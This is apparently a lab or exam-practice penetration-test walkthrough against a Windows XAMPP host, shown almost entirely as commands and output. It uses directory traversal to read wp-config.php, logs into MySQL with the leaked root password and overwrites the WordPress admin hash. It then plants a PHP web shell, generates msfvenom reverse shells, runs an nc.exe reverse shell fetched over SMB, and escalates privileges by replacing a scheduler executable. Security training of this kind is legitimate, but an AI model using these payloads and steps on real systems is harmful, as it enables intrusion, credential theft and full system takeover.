# 192.168.32.46

## Enumeration

```
root@kali:~/Downloads# nmap -Pn -sV -sC 192.168.32.46
Nmap scan report for 192.168.32.46
Host is up (0.098s latency).
Not shown: 991 filtered ports
PORT     STATE SERVICE          VERSION
80/tcp   open  http             Apache httpd 2.4.38 ((Win32) OpenSSL/1.1.1a PHP/7.3.2)
|_http-server-header: Apache/2.4.38 (Win32) OpenSSL/1.1.1a PHP/7.3.2
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.32.46/dashboard/
135/tcp  open  msrpc            Microsoft Windows RPC
139/tcp  open  netbios-ssn      Microsoft Windows netbios-ssn
443/tcp  open  ssl/http         Apache httpd 2.4.38 ((Win32) OpenSSL/1.1.1a PHP/7.3.2)
|_http-server-header: Apache/2.4.38 (Win32) OpenSSL/1.1.1a PHP/7.3.2
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.32.46/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: ERROR: Script execution failed (use -d to debug)
445/tcp  open  microsoft-ds?
3306/tcp open  mysql            MySQL 5.5.5-10.1.38-MariaDB
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.1.38-MariaDB
|   Thread ID: 3
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, FoundRows, Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpace
BeforeParenthesis, LongPassword, LongColumnFlag, ConnectWithDatabase, InteractiveClient, SupportsCompression, ODBCClient, SupportsLoadDataLocal, SupportsMultipleStatments
, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 8}1u~9=hr&b=G.O'ny8E
|_  Auth Plugin Name: 94
5800/tcp open  http-proxy       sslstrip
|_http-title: TightVNC desktop [socket]
5900/tcp open  vnc              VNC (protocol 3.8)
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes:
|_    STDV VNCAUTH_ (2)
8081/tcp open  blackice-icecap?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=ISO-8859-1
|     Content-Length: 76
|     Date: Mon, 06 Apr 2020 20:55:53 GMT
|     requested URL /nice ports,/Trinity.txt.bak was not found on this server.
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Type: text/html; charset=ISO-8859-1
|     Content-Length: 49
|     Date: Mon, 06 Apr 2020 20:55:53 GMT
|     requested URL / was not found on this server.
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Connection: close
|     Content-Length: 0
|     Date: Mon, 06 Apr 2020 20:55:59 GMT
|   SIPOptions:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Length: 0
|_    Date: Mon, 06 Apr 2020 20:55:53 GMT
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8081-TCP:V=7.70%I=7%D=4/6%Time=5E8B9A5F%P=i686-pc-linux-gnu%r(GetRe
SF:quest,C4,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=ISO-8859-1\r\nContent-Length:\x20
SF:49\r\nDate:\x20Mon,\x2006\x20Apr\x202020\x2020:55:53\x20GMT\r\n\r\nThe\
SF:x20requested\x20URL\x20/\x20was\x20not\x20found\x20on\x20this\x20server
SF:\.")%r(FourOhFourRequest,DF,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnec
SF:tion:\x20close\r\nContent-Type:\x20text/html;\x20charset=ISO-8859-1\r\n
SF:Content-Length:\x2076\r\nDate:\x20Mon,\x2006\x20Apr\x202020\x2020:55:53
SF:\x20GMT\r\n\r\nThe\x20requested\x20URL\x20/nice\x20ports,/Trinity\.txt\
SF:.bak\x20was\x20not\x20found\x20on\x20this\x20server\.")%r(SIPOptions,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent
SF:-Length:\x200\r\nDate:\x20Mon,\x2006\x20Apr\x202020\x2020:55:53\x20GMT\
SF:r\n\r\n")%r(HTTPOptions,5E,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20cl
SF:ose\r\nContent-Length:\x200\r\nDate:\x20Mon,\x2006\x20Apr\x202020\x2020
SF::55:59\x20GMT\r\n\r\n")%r(RTSPRequest,5E,"HTTP/1\.1\x20200\x20OK\r\nCon
SF:nection:\x20close\r\nContent-Length:\x200\r\nDate:\x20Mon,\x2006\x20Apr
SF:\x202020\x2020:55:59\x20GMT\r\n\r\n");
MAC Address: 00:50:56:B8:7D:2F (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -12m55s, deviation: 0s, median: -12m55s
|_nbstat: NetBIOS name: SOCKET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b8:7d:2f (VMware)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-04-06 16:57:22
|_  start_date: N/A
```

```
root@kali:~# gobuster -u http://192.168.32.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.32.46/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,200
=====================================================
/blog (Status: 301)
/img (Status: 301)
/Blog (Status: 301)
/dashboard (Status: 301)
/IMG (Status: 301)
/Img (Status: 301)
/Dashboard (Status: 301)


```


```
root@kali:~# gobuster -u http://192.168.32.46:8081 -w /opt/SecLists/Discovery/Web-Content/common.txt  -x txt,php,asp,db

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.32.46:8081/
[+] Threads      : 10
[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.php,.asp,.db
=====================================================
/README.txt (Status: 200)
/Readme.txt (Status: 200)
/history.txt (Status: 200)
```


https://www.exploit-db.com/exploits/45303


```
GET http://192.168.32.46:8081/..\..\..\..\xampp\htdocs\blog\wp-config.php HTTP/1.1
Host: 192.168.32.46:8081
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1



```

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'f1...' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```

```
root@kali:~/Downloads# mysql -u root -h 192.168.32.46 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5308
Server version: 10.1.38-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
| wordpress          |
+--------------------+
6 rows in set (0.11 sec)
```


```
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BjZgyK296hF1ZQSOb4v3OTSw1LBgor. | admin         | admin@exam.local |          | 2019-03-20 20:02:51 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.17 sec)
```



```
UPDATE `wp_users` SET `user_pass`= MD5('bypassed') WHERE `user_login`='admin';
```


## Low shell

http://192.168.32.46/blog/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen

```
<?php echo system($_REQUEST['shell']); ?>
```


```
root@kali:~/Downloads# msfvenom -p php/reverse_php LHOST=192.168.XX.XX LPORT=4444 -f raw > example.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3029 bytes
```

```
dir
 Volume in drive C has no label.
 Volume Serial Number is 12B4-A1BF

 Directory of C:\Users\thomas\Desktop

03/21/2019  03:46 PM    <DIR>          .
03/21/2019  03:46 PM    <DIR>          ..
04/07/2020  08:58 AM                32 local.txt
               1 File(s)             32 bytes
               2 Dir(s)   7,344,373,760 bytes free
type local.txt
5068...
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.32.46
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.32.254
```

## Privesc

https://www.exploit-db.com/exploits/45072


Improve shell:


```
\\192.168.XX.XX\LOVE\nc.exe 192.168.XX.XX 4445 -e cmd.exe
```



    Folder: C:\Program Files\SystemScheduler\WScheduler.exe
    FolderPerms: Everyone [WriteData/CreateFiles]
    File: C:\PROGRA~1\SYSTEM~1\WScheduler.exe /LOGON (Unquoted and Space detected)
    FilePerms: Everyone [WriteData/CreateFiles]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


```
root@kali:~/Downloads# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.XX.XX LPORT=443 -f exe -a x86 --platform win > WScheduler.exe
```


```
PS C:\> icacls "C:\Program Files\SystemScheduler"
icacls "C:\Program Files\SystemScheduler"
C:\Program Files\SystemScheduler Everyone:(OI)(CI)(M)
                                 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APP PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APP PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

```
move "C:\Program Files\SystemScheduler\WScheduler.exe" "C:\Program Files\SystemScheduler\WScheduler.back"

C:\xampp\htdocs\blog>copy \\192.168.XX.XX\LOVE\WScheduler.exe "C:\Program Files\SystemScheduler\"
copy \\192.168.XX.XX\LOVE\WScheduler.exe "C:\Program Files\SystemScheduler\"
        1 file(s) copied.

```


```
C:\xampp\htdocs\blog>shutdown /R
```


```
C:\Users\admin\Desktop>type proof.txt
type proof.txt
a66d...
C:\Users\admin\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.32.46
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.32.254

C:\Users\admin\Desktop>
```
